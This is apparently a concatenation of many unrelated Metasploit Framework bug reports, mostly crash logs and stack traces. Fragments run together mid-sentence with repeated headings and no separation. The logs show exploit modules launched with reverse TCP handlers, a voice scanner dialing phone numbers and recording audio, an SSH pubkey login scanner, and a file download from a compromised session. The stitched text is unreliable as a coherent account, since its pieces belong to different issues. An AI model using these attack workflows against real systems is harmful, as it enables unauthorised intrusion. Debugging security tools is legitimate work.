> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/plugins/openvas.rb:528:in `cmd_openvas_report_import'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
> [05/18/2019 13:34:42] [e(0)] core: /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
> [05/18/2019 13:34:42] [e(0)] core: /usr/bin/msfconsole:49:in `<main>' ## system stuff
simply abort execution as reported above no comments on the `~/.msf4/logs/framework.log` :
/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:106:in `block in spawn'
[05/14/2019 14:20:04] [e(0)] core: /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue_win8.rb failed to load due to the following error: errno::enoent no such file or directory @ rb_sysopen - /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue_win8.rb call stack: /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:77:in `initialize' /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:77:in `open' /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:77:in `read_module_content' /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:127:in `load_module' /usr/share/metasploit-framework/lib/msf/core/module_manager/cache.rb:91:in `block in load_cached_module' /usr/share/metasploit-framework/lib/msf/core/module_manager/cache.rb:86:in `each' /usr/share/metasploit-framework/lib/msf/core/module_manager/cache.rb:86:in `load_cached_module' /usr/share/metasploit-framework/lib/msf/core/module_set.rb:45:in `create' /usr/share/metasploit-framework/lib/msf/core/module_manager.rb:87:in `create' /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/modules.rb:642:in `cmd_use' /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command' /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single' /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each' /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single' /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run' /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start' /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start' /usr/bin/msfconsole:49:in `<main>'
[05/16/2019 16:12:27] [e(0)] core: exploit failed (multi/http/apache_mod_cgi_bash_env_exec): the following options failed to validate: lhost.
[05/16/2019 16:25:07] [e(0)] core: exploit failed (multi/http/openx_backdoor_php): the following options failed to validate: lhost.
[05/16/2019 16:25:19] [e(0)] core: exploit failed (multi/http/openx_backdoor_php): multi/meterpreter/reverse_http is not a compatible payload
## system stuff
when the module runs, it starts to work correctly but sometimes when trying to move to the next number the module crashes
the following is the module output including the stack trace: ```
msf5 auxiliary(scanner/voice/recorder) > run [*] dialing 1-800-222-0000...
[*] number: 1-800-222-0000 state: ringing frames: 0 dtmf: ''
[*] number: 1-800-222-0000 state: ringing frames: 0 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 2 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 52 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 101 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 152 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 202 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 252 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 302 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 352 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 402 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 451 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 502 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 552 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 602 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 652 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 702 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 753 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 803 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 853 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 903 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 953 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1002 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1053 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1102 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1153 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1203 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1253 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1299 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1354 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1403 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1453 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1503 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1554 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[*] completed number: 1-800-222-0000 state: answered frames: 1600 dtmf: ''
[+] 1-800-222-0000 resulted in 512000 bytes of audio saved to /tmp/1-800-222-0000.raw
[*] dialing 1-800-222-0001...
[-] auxiliary failed: ioerror closed stream
[-] call stack:
[-] /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-socket-0.1.17/lib/rex/socket/udp.rb:112:in `send'
[-] /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-socket-0.1.17/lib/rex/socket/udp.rb:112:in `sendto'
[-] /usr/share/metasploit-framework/lib/rex/proto/iax2/client.rb:124:in `send_data'
[-] /usr/share/metasploit-framework/lib/rex/proto/iax2/client.rb:171:in `send_new'
[-] /usr/share/metasploit-framework/lib/rex/proto/iax2/call.rb:117:in `dial'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/voice/recorder.rb:38:in `block (2 levels) in run'
[-] /usr/lib/ruby/2.5.0/timeout.rb:93:in `block in timeout'
[-] /usr/lib/ruby/2.5.0/timeout.rb:33:in `block in catch'
[-] /usr/lib/ruby/2.5.0/timeout.rb:33:in `catch'
[-] /usr/lib/ruby/2.5.0/timeout.rb:33:in `catch'
[-] /usr/lib/ruby/2.5.0/timeout.rb:108:in `timeout'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/voice/recorder.rb:36:in `block in run'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/voice/recorder.rb:32:in `each'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/voice/recorder.rb:32:in `run'
[*] auxiliary module execution completed ## system stuff
doing this creates an msfconsole instance inside msfconsole resulting in a laggy and broken interface
typing is slow and erratic can't really do anything until getting the stack trace shown in `system stuff` below
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
# traceback (most recent call last): 11: from /usr/bin/msfconsole:49:in `<main>' 10: from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start' 9: from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start' 8: from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:134:in `run' 7: from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `get_input_line' 6: from /usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:100:in `pgets' 5: from /usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:161:in `readline_with_output' 4: from /usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:164:in `rescue in readline_with_output' 3: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:1510:in `rl_cleanup_after_signal' 2: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:1522:in `_rl_clean_up_for_exit' 1: from /usr/share/metasploit-framework/lib/rex/ui/text/output/stdio.rb:48:in `flush'
/usr/share/metasploit-framework/lib/rex/ui/text/output/stdio.rb:48:in `flush': broken pipe (errno::epipe)
crash because of a non-declared variable being used
the fix in commit introduced a new bug
the variable `path` has been replaced by `uri` in line 69
however, `path` is still being used in lines 80, 86 and 90
source:
the vuln is not removed from the db ## system stuff
the note is not removed from the db ## system stuff
the arbitrary long option string is pushed on the stack and the payload is generated
this leads to a buffer overflow in the meterpreter and undefined behaviour
in the screenshot below is the debug output with a to long user agent
the https hash should be all zeroes
![overflow of the useragent into the http hash field]( in the screenshot below we can see the field alignment within meterpreter
if the user agent is to long the ssl_cert_hash field will corrupt (as seen above) ![field allignment within meterpreter]( ## system stuff
[shell]> download c:\\users\\cccc\\appdata\ oaming\\aaa.exe [-] session manipulation failed: undefined method `strip\' for nil:nilclass ["/usr/src/metasploit-framework/lib/msf/base/sessions/command_shell.rb:350:in `file_exists\'", "/usr/src/metasploit-framework/lib/msf/base/sessions/command_shell.rb:375:in `cmd_download\'", "/usr/src/metasploit-framework/lib/msf/base/sessions/command_shell.rb:604:in `run_builtin_cmd\'", "/usr/src/metasploit-framework/lib/msf/base/sessions/command_shell.rb:592:in `run_single\'", "/usr/src/metasploit-framework/lib/msf/base/sessions/command_shell.rb:761:in `_interact_stream\'", "/usr/src/metasploit-framework/lib/msf/base/sessions/command_shell.rb:745:in `_interact\'", "/usr/src/metasploit-framework/lib/rex/ui/interactive.rb:51:in `interact\'", "/usr/src/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1363:in `cmd_sessions\'", "/usr/src/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:522:in `run_command\'", "/usr/src/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:473:in `block in run_single\'", "/usr/src/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:467:in `each\'", "/usr/src/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:467:in `run_single\'", "/usr/src/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run\'", "/usr/src/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start\'", "/usr/src/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start\'", "./msfconsole:49:in `<main>\'"] ## system stuff
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
hosts list is empty you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff debian 9
[-] auxiliary failed: **openssl::ssl::sslerror ssl_connect returned=1 errno=0 state=error: certificate verify failed** full error:
f5 auxiliary(gather/shodan_search) > run [-] auxiliary failed: **openssl::ssl::sslerror ssl_connect returned=1 errno=0 state=error: certificate verify failed**
[-] call stack:
[-] /opt/metasploit-framework/embedded/lib/ruby/2.4.0/net/protocol.rb:44:in connect_nonblock' [-] /opt/metasploit-framework/embedded/lib/ruby/2.4.0/net/protocol.rb:44:inssl_socket_connect'
[-] /opt/metasploit-framework/embedded/lib/ruby/2.4.0/net/http.rb:948:in connect' [-] /opt/metasploit-framework/embedded/lib/ruby/2.4.0/net/http.rb:887:indo_start'
[-] /opt/metasploit-framework/embedded/lib/ruby/2.4.0/net/http.rb:876:in start' [-] /opt/metasploit-framework/embedded/lib/ruby/2.4.0/net/http.rb:1407:inrequest'
[-] /opt/metasploit-framework/embedded/framework/modules/auxiliary/gather/shodan_search.rb:59:in shodan_query' [-] /opt/metasploit-framework/embedded/framework/modules/auxiliary/gather/shodan_search.rb:109:inrun'
[*] auxiliary module execution completed
[*] started reverse tcp handler on 192.168.0.13:4444 [*] 192.168.0.14:445 - connecting to the server...
[*] 192.168.0.14:445 - authenticating to 192.168.0.14:445|test as user 'username'...
[*] 192.168.0.14:445 - selecting powershell target
[*] 192.168.0.14:445 - executing the payload...
[-] 192.168.0.14:445 - exploit failed: nameerror uninitialized constant msf::exploit::remote::smb::client::psexec::failure
[*] exploit completed, but no session was created
## system stuff i'm using macbook air
msf5 exploit(multi/http/jira_plugin_upload) > run [*] started reverse tcp handler on 10.150.29.100:4444
[-] exploit failed: nomethoderror undefined method `[]' for nil:nilclass ```
## system stuff
i get exception:
msf::rpc::serverexception (nomethoderror undefined method `migrated\' for #<metasploit::framework::dataservice::remotehttpdataservice: > ["lib/metasploit/framework/data_service/proxy/core.rb:136:in `method_missing\'", "lib/msf/ui/web/console.rb:52:in `initialize\'", "lib/msf/ui/web/driver.rb:67:in `new\'", "lib/msf/ui/web/driver.rb:67:in `create_console\'", "lib/msf/core/rpc/v10/rpc_console.rb:29:in `rpc_create\'", "lib/msf/core/rpc/v10/service.rb:153:in `block in process\'", "lib/ruby/2.6.0/timeout.rb:93:in `block in timeout\'", "lib/ruby/2.6.0/timeout.rb:33:in `block in catch\'", "lib/ruby/2.6.0/timeout.rb:33:in `catch\'", "lib/ruby/2.6.0/timeout.rb:33:in `catch\'", "lib/ruby/2.6.0/timeout.rb:108:in `timeout\'", "lib/msf/core/rpc/v10/service.rb:153:in `process\'", "lib/msf/core/rpc/v10/service.rb:91:in `on_request_uri\'", "lib/msf/core/rpc/v10/service.rb:72:in `block in start\'", "lib/rex/proto/http/handler/proc.rb:38:in `on_request\'", "lib/rex/proto/http/server.rb:368:in `dispatch_request\'", "lib/rex/proto/http/server.rb:302:in `on_client_data\'", "lib/rex/proto/http/server.rb:161:in `block in start\'", "lib/rex/io/stream_server.rb:48:in `on_client_data\'", "lib/rex/io/stream_server.rb:199:in `block in monitor_clients\'", "lib/rex/io/stream_server.rb:197:in `each\'", "lib/rex/io/stream_server.rb:197:in `monitor_clients\'", "lib/rex/io/stream_server.rb:73:in `block in start\'", "lib/rex/thread_factory.rb:22:in `block in spawn\'", "lib/msf/core/thread_manager.rb:106:in `block in spawn\'"])
``` ## system stuff
[*] started reverse tcp double handler on myip
[*] creating our corrupted session id...
[-] exploit failed: nomethoderror undefined method `code' for nil:nilclass
[*] shutting down payload stager listener...
[*] exploit completed, but no session was created.
``` ## system stuff tried it on both the latest kali version as well as 2018.3a, same error in both of them
stops the rhosts flow, displays database error - valid logins are still logged correctly you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ```
[-] auxiliary failed: runtimeerror problem invalidating login: pg::invalidregularexpression: error: invalid regular expression: quantifier operand invalid
: select distinct "metasploit_credential_cores"."id", "metasploit_credential_cores"."id" as alias_0 from "metasploit_credential_cores" left outer join "metasploit_credential_privates" on "metasploit_credential_privates"."id" = "metasploit_credential_cores"."private_id" left outer join "metasploit_credential_publics" on "metasploit_credential_publics"."id" = "metasploit_credential_cores"."public_id" left outer join "metasploit_credential_logins" on "metasploit_credential_logins"."core_id" = "metasploit_credential_cores"."id" left outer join "services" on "services"."id" = "metasploit_credential_logins"."service_id" left outer join "hosts" on "hosts"."id" = "services"."host_id" left outer join "metasploit_credential_realms" on "metasploit_credential_realms"."id" = "metasploit_credential_cores"."realm_id" where "metasploit_credential_cores"."workspace_id" = $1 and "services"."name" in (\'ssh\') and "services"."port" in (22) and ("metasploit_credential_publics"."username" ~* \'^ubuntu$\') and ("metasploit_credential_privates"."data" ~* \'^-----begin rsa private key-----
-----end rsa private key-----
$\') and ("metasploit_credential_logins"."id" is not null) order by "metasploit_credential_cores"."id" asc limit 1
see log for more details.
[-] call stack:
[-] /users/donthackmebro/documents/pentest/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:174:in `log_error'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/lib/metasploit/framework/data_service/proxy/login_data_proxy.rb:55:in `rescue in invalidate_login'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/lib/metasploit/framework/data_service/proxy/login_data_proxy.rb:32:in `invalidate_login'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/lib/msf/core/auxiliary/report.rb:58:in `invalidate_login'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/modules/auxiliary/scanner/ssh/ssh_login_pubkey.rb:168:in `block in run_host'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:234:in `block in scan!'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:179:in `block in each_credential'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/modules/auxiliary/scanner/ssh/ssh_login_pubkey.rb:232:in `block in each'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/modules/auxiliary/scanner/ssh/ssh_login_pubkey.rb:239:in `block in each_key'
[-] /users/donthackmebro/.rvm/rubies/ruby-2.5.3/lib/ruby/2.5.0/set.rb:338:in `each_key'
[-] /users/donthackmebro/.rvm/rubies/ruby-2.5.3/lib/ruby/2.5.0/set.rb:338:in `each'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/modules/auxiliary/scanner/ssh/ssh_login_pubkey.rb:238:in `each_key'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/modules/auxiliary/scanner/ssh/ssh_login_pubkey.rb:231:in `each'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:141:in `each_credential'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:205:in `scan!'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/modules/auxiliary/scanner/ssh/ssh_login_pubkey.rb:141:in `run_host'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:111:in `block (2 levels) in run'
[-] /users/donthackmebro/documents/pentest/metasploit-framework/lib/msf/core/thread_manager.rb:106:in `block in spawn'
[*] auxiliary module execution completed
``` ## system stuff ruby-2.5.3 [ x86_64 ] postgres (postgresql) 11.1
installed via homebrew
when i enter msfconsole command in the terminal this error pops up:
traceback (most recent call last):ork console...- 30: from /usr/bin/msfconsole:49:in `<main>' 29: from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start' 28: from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start' 27: from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `driver' 26: from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `new' 25: from /usr/share/metasploit-framework/lib/msf/ui/console/driver.rb:161:in `initialize' 24: from /usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:49:in `init_module_paths' 23: from /usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:49:in `each' 22: from /usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:50:in `block in init_module_paths' 21: from /usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:40:in `add_module_path' 20: from /usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:40:in `each' 19: from /usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:41:in `block in add_module_path' 18: from /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:117:in `load_modules' 17: from /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:117:in `each' 16: from /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:119:in `block in load_modules' 15: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:238:in `load_modules' 14: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:30:in `each_module_reference_name' 13: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:30:in `foreach' 12: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:40:in `block in each_module_reference_name' 11: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:132:in `find' 10: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:132:in `catch' 9: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:133:in `block in find' 8: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:49:in `block (2 levels) in each_module_reference_name' 7: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:239:in `block in load_modules' 6: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:177:in `load_module' 5: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:543:in `namespace_module_transaction' 4: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:365:in `current_module' 3: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:365:in `reduce' 2: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:365:in `each' 1: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:370:in `block in current_module'
/usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:380:in `rescue in block in current_module': auxiliary/voip/viproy_sip-invite-sdptest must be lowercase alphanumeric snake case (msf::moduleloaderror)
i get the following output:
[*] server started.
[*] 10.0.5.240 firefox_webidl_injection - gathering target information for 10.0.5.240
[*] 10.0.5.240 firefox_webidl_injection - sending html response to 10.0.5.240
[-] 10.0.5.240 firefox_webidl_injection - exception handling request: undefined method `report_client' for #<metasploit::framework::dataservice::remotehttpdataservice: >
did you mean? report_event report_loot
``` `framework.log` contains:
[03/04/2019 19:51:23] [e(0)] rex: proc::on_request: nomethoderror: undefined method `report_client' for #<metasploit::framework::dataservice::remotehttpdataservice: >
did you mean? report_event report_loot /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/data_service/proxy/core.rb:136:in `method_missing'
/opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/report.rb:145:in `report_client'
/opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/remote/browser_exploit_server.rb:335:in `process_browser_info'
/opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/remote/browser_exploit_server.rb:569:in `on_request_uri'
/opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/http/server.rb:163:in `block in start_service'
/opt/metasploit-framework/embedded/framework/lib/rex/proto/http/handler/proc.rb:38:in `on_request'
/opt/metasploit-framework/embedded/framework/lib/rex/proto/http/server.rb:368:in `dispatch_request'
/opt/metasploit-framework/embedded/framework/lib/rex/proto/http/server.rb:302:in `on_client_data'
/opt/metasploit-framework/embedded/framework/lib/rex/proto/http/server.rb:161:in `block in start'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.5.0/gems/rex-core-0.1.13/lib/rex/io/stream_server.rb:48:in `on_client_data'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.5.0/gems/rex-core-0.1.13/lib/rex/io/stream_server.rb:199:in `block in monitor_clients'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.5.0/gems/rex-core-0.1.13/lib/rex/io/stream_server.rb:197:in `each'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.5.0/gems/rex-core-0.1.13/lib/rex/io/stream_server.rb:197:in `monitor_clients'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.5.0/gems/rex-core-0.1.13/lib/rex/io/stream_server.rb:73:in `block in start'
/opt/metasploit-framework/embedded/framework/lib/rex/thread_factory.rb:22:in `block in spawn'
/opt/metasploit-framework/embedded/framework/lib/msf/core/thread_manager.rb:106:in `block in spawn'
``` ## system stuff
database initialization failed and postgresql doesn't start
## system stuff windows 10 (build 17763.316)
receive the following messages
[!] session may not be compatible with this module.
[*] running module against 10.90.60.80
[*] searching for subnets to autoroute.
[-] post failed: argumenterror invalid :session, expected session object got msf::sessions::meterpreter_x86_linux
[-] call stack:
[-] /usr/share/metasploit-framework/lib/msf/core/db_manager/route.rb:10:in `report_session_route'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:136:in `method_missing'
[-] /usr/share/metasploit-framework/lib/msf/core/framework.rb:505:in `on_session_route'
[-] /usr/share/metasploit-framework/lib/msf/core/event_dispatcher.rb:183:in `block in method_missing'
[-] /usr/share/metasploit-framework/lib/msf/core/event_dispatcher.rb:181:in `each'
[-] /usr/share/metasploit-framework/lib/msf/core/event_dispatcher.rb:181:in `method_missing'
[-] /usr/share/metasploit-framework/lib/msf/core/session.rb:424:in `<<'
[-] /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-socket-0.1.16/lib/rex/socket/switch_board.rb:80:in `add_route'
[-] /usr/share/metasploit-framework/modules/post/multi/manage/autoroute.rb:232:in `add_route'
[-] /usr/share/metasploit-framework/modules/post/multi/manage/autoroute.rb:299:in `block in autoadd_routes'
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/config.rb:174:in `each'
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/config.rb:174:in `each_route'
[-] /usr/share/metasploit-framework/modules/post/multi/manage/autoroute.rb:293:in `autoadd_routes'
[-] /usr/share/metasploit-framework/modules/post/multi/manage/autoroute.rb:73:in `run'
[*] post module execution completed
``` in the framework.log file everytime i try to run either a routing command or another module such as the post/linux/gather/hashdump module it creates log entries that state the following:
[date time] {w(0)] core: warning: trying to report a session_event for a session with no db_record (#)
``` i just put date and time as there's different time stamps, and i generalised the session number
in the log file it has the specific session number i tried to use
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
kali 2019.1
metasploit fails to connect to the http data service but the console still works normally ```
found a database at /users/person/.msf4/db, checking to see if it is started
starting database at /users/person/.msf4/db...success
msf web service is already running as pid 834
[-] error while running command db_connect: failed to connect to the http data service: data service does not appear to be responding call stack:
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/db.rb:2088:in `rescue in db_connect_http'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/db.rb:2083:in `db_connect_http'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/db.rb:1837:in `cmd_db_connect'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:522:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:473:in `block in run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:467:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:467:in `run_single'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/driver.rb:252:in `block in load_db_config'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/driver.rb:239:in `each_pair'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/driver.rb:239:in `load_db_config'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/driver.rb:133:in `initialize'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:62:in `new'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:62:in `driver'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start'
/opt/metasploit-framework/bin/../embedded/framework/msfconsole:49:in `<main>'
``` `db_status` returns this `[*] connected to msf
connection type: postgresql.` i have tried reinitialising the database using `msfdb reinit` but that has this error ```
attempting to start msf web service...failed
[!] msf web service appears to be started, but may not operate as expected.
